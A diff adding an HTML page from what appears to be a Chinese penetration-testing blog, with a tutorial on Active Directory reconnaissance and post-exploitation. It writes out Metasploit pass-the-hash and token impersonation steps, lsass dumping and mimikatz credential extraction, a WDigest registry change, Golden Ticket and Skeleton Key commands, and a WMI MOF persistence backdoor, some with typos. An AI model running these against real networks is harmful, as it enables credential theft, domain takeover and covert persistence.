@@ -1,0 +1,681 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="H0ne">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="AD域信息收集AD（活动目录）域是指windows服务器操作系统中的目录服务，它被包含在大多数windows server操作系统中，负责集中式域管理员身份验证。 AD架构的常用对象包括如下四种 1234组织单位（OU）：它是可以指派组策略设置或委派管理权限的最小作用单位。域（domain）：它是网络对象用户，组，计算机等的分组，域中的所有对象都存储在AD中，AD由一个或多个域构成，域是Windo">
+<meta property="og:type" content="article">
+<meta property="og:title" content="内网">
+<meta property="og:url" content="http://example.com/2023/04/20/%E5%86%85%E7%BD%91/index.html">
+<meta property="og:site_name" content="H0ne&#39;s Blog">
+<meta property="og:description" content="AD域信息收集AD（活动目录）域是指windows服务器操作系统中的目录服务，它被包含在大多数windows server操作系统中，负责集中式域管理员身份验证。 AD架构的常用对象包括如下四种 1234组织单位（OU）：它是可以指派组策略设置或委派管理权限的最小作用单位。域（domain）：它是网络对象用户，组，计算机等的分组，域中的所有对象都存储在AD中，AD由一个或多个域构成，域是Windo">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/7243a3fbc4a148118e08040d52ee38d3.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/9663a279aac543cea4d39b2c4e5e8ac9.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/f777dc7fcfdf48b1b58f1dec283c3fa6.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/317a522d452249319701a6b09420b537.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/40d7ca871b754052a578935de12a85fd.png">
+<meta property="article:published_time" content="2023-04-20T15:33:27.685Z">
+<meta property="article:modified_time" content="2023-04-20T15:22:17.122Z">
+<meta property="article:author" content="H0ne">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://img-blog.csdnimg.cn/7243a3fbc4a148118e08040d52ee38d3.png">
+  
+  
+  
+  <title>内网 - H0ne&#39;s Blog</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+  
+<link rel="stylesheet" href="/css/fluid-extension.css">
+<link rel="stylesheet" href="//cdn.jsdelivr.net/gh/EmoryHuang/BlogBeautify@1.1/shubiao.css">
+<link rel="stylesheet" href="//cdn.jsdelivr.net/gh/EmoryHuang/BlogBeautify@1.1/scroll.css">
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.4","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>H0ne&#39;s Blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="内网"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2023-04-20 23:33" pubdate>
+          2023年4月20日 晚上
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          6.6k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          55 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">内网</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h3 id="AD域信息收集"><a href="#AD域信息收集" class="headerlink" title="AD域信息收集"></a>AD域信息收集</h3><p>AD（活动目录）域是指windows服务器操作系统中的目录服务，它被包含在大多数windows server操作系统中，负责集中式域管理员身份验证。</p>
+<p>AD架构的常用对象包括如下四种</p>
+<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs css">组织单位（OU）：它是可以指派组策略设置或委派管理权限的最小作用单位。<br>域（domain）：它是网络对象用户，组，计算机等的分组，域中的所有对象都存储在AD中，AD由一个或多个域构成，域是Windows操作系统中的一个安全边界，安全策略和访问控制都不能跨越不同的域，每个域管理员有权限设置所属域的策略。<br>域树（domain tree）：它由多个域构成，这些域共享公共的架构，配置和全局编录能力，形成一个连续的名称空间，域之间的通信通过信任关系进行（若域间没有信任关系，则域间无法传递信息），域树中的任何两个域之间都是双向可传递的信任关系。<br>林（forest）：林由一个或多个域树组成，同一林中的域可以共享同类的架构，站点，复制及全局编录能力。信任关系具有传递性，例如林<span class="hljs-selector-tag">A</span>与林<span class="hljs-selector-tag">B</span>有信任关系，林<span class="hljs-selector-tag">B</span>和林C有信任关系，则通过传递性，林<span class="hljs-selector-tag">A</span>和林C也具有信任关系。<br></code></pre></td></tr></table></figure>
+<p>AD域主要包括以下功能</p>
+<p>服务器及客户端计算机管理：管理服务器及客户端计算机账户，将所有服务器及客户端计算机加入域管理并实施组策略<br>用户服务：管理用户域账户，用户信息，企业通讯录（与电子邮件系统集成）用户组管理，用户身份认证及用户授权管理等，按需实施组管理策略。<br>资源管理：管理打印机，文件共享服务等网络资源<br>桌面配置：系统管理员可以集中配置各种桌面配置策略，<br>应用系统支撑：支持财务，人事，电子邮件，企业信息门户，办公自动化，补丁管理及防病毒系统等各种应用系统</p>
+<p>判断当前计算机是否在域中的命令<br>net config workstation<br><img src="https://img-blog.csdnimg.cn/7243a3fbc4a148118e08040d52ee38d3.png" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"><br>查询本地管理员组用户列表的命令如下<br>net localgroup administrators<br><img src="https://img-blog.csdnimg.cn/9663a279aac543cea4d39b2c4e5e8ac9.png" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"><br>查询域中工作组列表：net WORKGROUP &#x2F;domain<br>查询指定工作组的信息：net WORKGROUP “Domain 名称” &#x2F;domain<br>查询域用户信息的命令：net user                                    </p>
+<p>通过Hash值进行攻击，	<br>在windows操作系统中，系统或服务器需要身份验证时，会使用到NTLM协议。<br> <img src="https://img-blog.csdnimg.cn/f777dc7fcfdf48b1b58f1dec283c3fa6.png" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"><br>一次完整的网络验证并不需要明文密码，只需要hash值。如果攻击者得到了用户密码的Hash值，呢么就可以直接对远程系统进行身份验证。</p>
+<p>如果咱么在注册表获取到windows hash值，呢么咱们可以通过MSF的exploit&#x2F;windows&#x2F;smb&#x2F;psexec模块进行攻击</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs routeros">use exploit/windows/smb/psexec<br><span class="hljs-built_in">set</span> LHOST<span class="hljs-built_in"> IP</span><br><span class="hljs-built_in"></span><span class="hljs-built_in">SET</span> LPORT 443<br><span class="hljs-built_in">SET</span> RHOST<span class="hljs-built_in"> IP</span><br><span class="hljs-built_in"></span><span class="hljs-built_in">SET</span> SMBpass   <br>(这里输入LM:NTLM的值）<br><span class="hljs-built_in">set</span> smbuser administrator    （这里设置获取的hash值对应的用户，我这里是管理员的）                      <br><span class="hljs-built_in">run</span> (最后进行攻击)<br></code></pre></td></tr></table></figure>
+
+
+<p>令牌劫持<br>令牌(token)是指系统的临时密钥，它允许在不提供密码或其他凭证的前提下访问网络和系统资源，<br>windows有以下两种类型的令牌<br>授权令牌：用于交互会话登录（例如本地用户直接登录，远程桌面登录）<br>模拟令牌：用于非交互登录</p>
+<p>（1）使用Metasploit中的PsExec工具指定Administrator账户远程登录目标主机，配置好PsExec登录windows 2008计算机<br>（2）执行令牌劫持<br>1、执行use incognito命令，加载令牌劫持模块incognito<br>2、执行list_tokens -u命令，列出可用令牌<br>3、选择目标用户的令牌，用其身份执行命令<br>（3）输入impersonate_token TEST\sanr 命令加载使用sanr用户的令牌，随后进行shell命令获得在系统上交互执行命令的权限。                                                                                                             </p>
+<h3 id="NTDS-dit"><a href="#NTDS-dit" class="headerlink" title="NTDS.dit"></a>NTDS.dit</h3><p>NTDS.dit文件是AD的数据库，等同于本地计算机中的sam文件，他的存放位置在%SystemRoot%\ntds\，此文件包含的不只是用户名和HASH，还有OU，Group等。</p>
+<p>在渗透测试过程中，只要控制了域控制器，就可以进行NTDS.dit文件备份，通过NTDS.dit文件可以获取NT Hash及LM Hash，随后通过破解HASH来获取用户的明文密码</p>
+<p>提取HASH<br>QuarksPwDump<br>这是quarklab出品的一款一区用户凭据的开源工具，</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/quarkslab/quarkspwdump%E8%8E%B7%E5%8F%96%EF%BC%8C%E8%AF%A5%E5%B7%A5%E5%85%B7%E6%94%AF%E6%8C%81windows">https://github.com/quarkslab/quarkspwdump获取，该工具支持windows</a> XP&#x2F;2003&#x2F;vista&#x2F;7&#x2F;2008等版本操作系统，他可以提取windows平台下多种类型的用户凭据，包括本地账户，域账户，缓存域账户和Bitlocker等<br>这个工具不适用linux系统，在linux系统中，用libesedb-tools中的esedbexport工具来完成。</p>
+<p>HASH破解<br>得到HASH后，需要破解出密文，John the Ripper是一款免费，开源的密码破解工具，它可在密文已知的情况下尝试破解出明文，支持目前大多数的加密算法，如des，md4和md5等</p>
+<h2 id="明文凭据"><a href="#明文凭据" class="headerlink" title="明文凭据"></a>明文凭据</h2><p>通过破解windows hash值或键盘记录程序来获取明文密码所需要的时间很长，我们可以使用windows Credentials Editor (WCE) 和mimitakz来获取明文密码，这两个工具都需要管理员权限。</p>
+<p> WCE是一款被专业安全人员广泛使用的安全工具，在渗透测试中用来评估windows网络的安全性，可列出登录回话和添加，更改，删除关联的凭据。工具支持windows XP&#x2F;2003&#x2F;Vista&#x2F;7&#x2F;2008和windows8操作系统<br> <a target="_blank" rel="noopener" href="https://www.ampliasecurity.com/research.html">https://www.ampliasecurity.com/research.html</a> 工具地址</p>
+<p>只要拥有管理员权限，使用-w参数就可以获取到内存的用户明文密码，不需要破解hash值<img src="https://img-blog.csdnimg.cn/317a522d452249319701a6b09420b537.png" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"></p>
+<p>mimitakz<br>这个工具被WCE更加强大，能够从windows认证(LSASS)进程中获取windows处于active状态时的账号明文密码<br>软件下载地址:<a target="_blank" rel="noopener" href="https://github.com/gentilkiwi/mimikatz">https://github.com/gentilkiwi/mimikatz</a><br>我们通过两个命令获取windows hash值和明文密码，第一个命令 privilege::debug。用于提升权限，第二个命令，sekurlsa::logonpasswords，用于获取windows hash值和明文密码<br>sekurlsa模块 获取密码信息<br>Mimikatz提取用户凭证功能，其主要集中在sekurlsa模块，该模块又包含很多子模块，如msv，wdigest，kerberos等。如上面演示的抓取明文密码的sekurlsa::logonpasswords模块。</p>
+<p>使用这些子模块可以提取相应的用户凭证，如</p>
+<p>sekurlsa::msv提取ntlm hash凭证（对应上面截图的msv部分）；</p>
+<p>sekurlsa::wdigest提取用户密码明文（对应上面截图的wdigest部分）；</p>
+<p>sekurlsa::kerberos提取域账户凭证。</p>
+<p>procdump + mimikatz 加载dmp文件，并导出其中的明文密码<br> 管理员运行工具，导出为lsass.dump文件：</p>
+<p>procdump64.exe -accepteula -ma lsass.exe lsass.dmp<br>将lsass.dmp放在mimikatz同一目录，读取密码文件：</p>
+<p>sekurlsa::minidump lsass.dmp<br>sekurlsa::logonpasswords full   </p>
+<p>如果已经安装了KB2871997补丁或windows8.1版本以后的操作系统，使用mimitakz和WCE已经获取不到明文密码，如果想要抓取密码，需要将注册表HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest下的UseLogonCredential设置为1，类型设置为DWORD 32，此时需要设置的命令如下<br>reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest<br>&#x2F;vUseLogonCredential &#x2F;t REG_DWORD &#x2F;d 1<br>当用户再次登录时，两种工具就能记录到明文密码了</p>
+<p>利用域控制器<br>Golden Ticket （黄金票据）是指利用krbtgt用户和Hash伪造票据授予票据(TGT)，冒充任意用户身份无限制地访问整个域中的机器且还可以提升为域管理员，mimtakz把黄金票据的这种特性成为“万能票据”<br>krbtgt账号用来创建票据授予服务加密的密钥，该账号在创建域控制器时由系统自动创建，并且其密码随机分配</p>
+<p>要想伪造用户身份，满足的四个条件<br>域SID。<br>域名称。<br>krbtgt账户的NTLM Hash<br>模拟的目标用户名（如域管理）</p>
+<p>（1）查找域管理员，相关命令<br>net group “domain admins” &#x2F;domain<br>（2）获取域SID，直接执行whoami &#x2F;user就可以，要删除SID的-的最后几位，还有就是pstools，使用PsGetsid.exe获取sid</p>
+<p>（3）获取krbtgt账户的NTLM Hash需要拥有访问域控制器的权限，使用交互方式或远程方式登录域控制器后，使用mimitakz来提取krbtgt账户的NTLM Hash<br>privilege::debug<br>成功之后进入mimitakz，lsadump::lsa &#x2F;inject &#x2F;name:krbtgt</p>
+<p><img src="https://img-blog.csdnimg.cn/40d7ca871b754052a578935de12a85fd.png" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"><br>（4）伪造Golden Ticker进行pass-the-ticket攻击，伪造项有以下三个<br>Domain: pentestlab.com<br>SID:S-1-5-21-1334711466-443186531-4248587964<br>Hash:cc6aff59ff667b75b6294349f53ab415</p>
+<p>生成需要模拟的用户的票据，以模拟域管理员admin用户为例，执行命令<br>mimikatz# kerberos::gloden &#x2F;user:admin &#x2F;domain: pentestlab.com<br>&#x2F;sid::S-1-5-21-1334711466-443186531-4248587964<br>&#x2F;krbtgt:cc6aff59ff667b75b6294349f53ab415 &#x2F;admin:admin.tck &#x2F;ppt<br>（5）测试获得的管理权限，<br>dir\dc.pentestlab.com\ c$<br>PsExec.exe \dc.pentestlab.com\ cmd.exe</p>
+<h3 id="Skeleton-key"><a href="#Skeleton-key" class="headerlink" title="Skeleton key"></a>Skeleton key</h3><p>skeleton key被称为万能钥匙，是一种域控制器权限维持工具，他无需破解域用户的任何密码，就可以让所有域用户使用同一个密码在域中进行身份认证，进行此攻击时，需要运行在64位操作系统的域控制器中，并且拥有域管理员权限。<br>在域控制器上执行mimitakz# misc::skeleton命令，这回将kerberos加密降级倒RC4_HMAC_MD5,并以内存更新的方式将主密码修补到lsass.exe进程，让所有域用户使用同一个密码登录域中的主机，此时原有域用户密码正常工作，不影响任何使用</p>
+<p>(1)在域控制器上安装Skeleton Key<br>相关命令如下：<br>privilege::debug<br>misc::skeleton<br>(2)域内主机使用Skeleton key登录，此时不需要知道域管理员admin密码，使用主密码mimitakz就可以建立磁盘映射，查看域控制器中的C盘的文件<br>net use \dc.pentest.lab.com ,i,itakz &#x2F;user:admin<br>dir\dc.pentest.lab.com\c$</p>
+<h3 id="WMI"><a href="#WMI" class="headerlink" title="WMI"></a>WMI</h3><p>WMI是在每个windows操作系统中都会内置的一个管理框架，它以本地和远程方式提供了许多管理功能，如查询系统信息，启动和停止进程，以及设置条件触发器等，我们可以使用各种工具（如windows的WMI命令行工具wmic.exe）或者脚本编程语言（如powershell）提供的API接口哦来访问WMI，windows操作系统的WMI数据存储在WMI公共信息模型仓库中，该仓库由System32\whem\Repository文件夹中的多个文件组成</p>
+<p>WMI类是WMI的主要结构，具有操作权限的用户还可以自定义类或扩展许多默认类的功能，在满足特定条件时，我们可以使用WMI永久事件订阅机制来触发特定操作，攻击者经常利用该功能，让系统启动时自动执行后门程序，以达成进行权限维持的目标</p>
+<p>WMI的事件订阅包含以下3个核心WMI类</p>
+<p>Consumer类：用来指定要执行的具体操作，包括执行命令，运行脚本，添加日志条目及发送邮件等<br>Filter类：用来定义触发Consumer的具体条件，包括系统启动，特定程序执行，特定时间间隔及其他条件。<br>FilterToConsumerBilnding类：用来将Consumer与Filter关联在一起，创建一个WMI永久事件订阅时，需要系统的管理员权限。<br>通过这种方法，WMI攻击者可以在操作系统中安装一个持久性后门，并且除了在WMI仓库中留下的文件外，不会再系统磁盘上留下其他任何文件。</p>
+<p>下面进行测试，打开notepad来触发后门。代码</p>
+<figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs smali"><span class="hljs-comment">#!vb</span><br><span class="hljs-comment">#PRAGMA NAMESPACE (*\\\\.\\root\\subscription&quot;)</span><span class="hljs-built_in"></span><br><span class="hljs-built_in">instance </span>of CommandLineEventConsumer as $Cons<br>&#123;<br>     Name = <span class="hljs-string">&quot;Powershell Helper&quot;</span>;<br>     RunInteractively=false;<br>     CommandLineTemplate=<span class="hljs-string">&quot;cmd /C C:\Users\Desktop\sanr.exe&quot;</span>;<br>&#125;;<br><span class="hljs-built_in"></span><br><span class="hljs-built_in">instance </span>of _EventFilter as $Filt<br>&#123;<br>     Name = <span class="hljs-string">&quot;EventFilter&quot;</span>;<br>     EventNamespace = <span class="hljs-string">&quot;Root\\Cimv2&quot;</span>;<br>     Query =<span class="hljs-string">&quot;SELECT * FROM _InstanceCreationEvent Within 5&quot;</span><br>                  <span class="hljs-string">&quot;Where TargetInstance Isa \&quot;</span>Win32_Process<span class="hljs-string">&quot; &quot;</span><br>                  <span class="hljs-string">&quot;And Targetinstance.Name = \&quot;</span>notepad.exe<span class="hljs-string">&quot; &quot;</span> ;<br>       Query<span class="hljs-class">Language = &quot;QWL&quot;;</span><br>&#125;;<br><span class="hljs-built_in"></span><br><span class="hljs-built_in">instance </span>of _FilterToConsumerBinding &#123;<br>        Filter = $Filt;<br>        Consumer = $Cons;<br>&#125;;<br></code></pre></td></tr></table></figure>
+<p>以上内容保存位test.mof,并将其放到%SYSTEMROOT%&#x2F;WBEM&#x2F;MOF目录下<br>执行MOF文件后，就可以查看我们添加的各类WMI事件，具体操作如下<br>（1）列出Filter事件，命令<br>Get-WMIObject -Namespace root\Subscription -Class _EventFilter<br>（2）查看consumers事件，相关命令如下<br>Get-WMIObject -Namespace root\subscription -Class _EventConsumer<br>（3）查看Bindings事件，相关命令如下<br>Get_WMIObject -Namespace root\Subcription -Class _FilterToConsumerBinding<br>（4）触发后门，当被攻击者打开，notepad时，系统就会自动执行CMD命令，向C盘的sanr.txt文本文件中写入PegasusTeam字符串</p>
+<p>​                                                                                                                                                                                                                                                                                                                              </p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>内网</div>
+      <div>http://example.com/2023/04/20/内网/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>H0ne</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2023年4月20日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2023/04/20/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%BB%8E%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%88%B0RCE/" title="渗透测试从代码审计到RCE">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">渗透测试从代码审计到RCE</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2023/04/20/%E8%AE%B0PHP%E4%B8%80%E6%AC%A1%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" title="记PHP一次代码审计">
+                        <span class="hidden-mobile">记PHP一次代码审计</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.2/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
